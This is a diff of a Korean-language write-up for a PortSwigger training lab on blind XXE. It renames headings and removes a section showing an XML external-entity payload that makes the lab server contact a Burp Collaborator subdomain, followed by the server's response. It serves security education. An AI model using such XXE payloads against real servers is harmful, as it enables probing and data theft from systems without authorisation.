@@ -12,7 +12,7 @@ toc: true
 - 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
 - 난이도: PRACTITIONER (중간)
 
-# 문제분석 
+# 랩 개요  
 - 이전 문제와 마찬가지로 "Check stock" 기능으로 XXE가 가능하다. 
 - XXE로 문제 서버를 외부도메인과 통신하도록  (out-of-band interaction) 하는 것이  가능하다. 
 - XXE를 통해 특정 DNS 요청을 발생시키면 될 것 같다. 
@@ -58,7 +58,7 @@ Connection: close
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>5</productId><storeId>1</storeId></stockCheck>
 ```
 
-## 1차 시도 
+## Out-of-band 통신 발생 시도
 HTTPS 요청 하는 대상을 burpcollaborator.net의 임의의 서브도메인 xxetest를 지정한 `xxetest.burpcollaborator.net` 로 지정해서 요청해보았다. 
 
 ```xml 
@@ -81,29 +81,6 @@ Content-Length: 19
 "XML parsing error"
 ```
 
-## 2차 시도 
-페이로드에서 `&xxe;` 를 없애고 보내봤다. 
-
-```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://xxetest.burpcollaborator.net"> ]>
-<stockCheck>
-	<productId>5</productId>
-	<storeId>1</storeId>
-</stockCheck>
-```
-
-평범한 응답이 돌아온다. 
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/plain; charset=utf-8
-Connection: close
-Content-Length: 3
-
-183
-```
-
-![Blind XXE Repater](/images/burp-academy-xxe-3-repeater.png)
 
 여기서 웹 페이지를 보면 성공했다는 메세지가 보인다. 문제서버에서 burpcollaborator.net 도메인을 관리하는 DNS서버로 `xxetest.burpcollaborator.net` 도메인의 IP를 물어보는 DNS 쿼리가 발생한 것이다! 
 
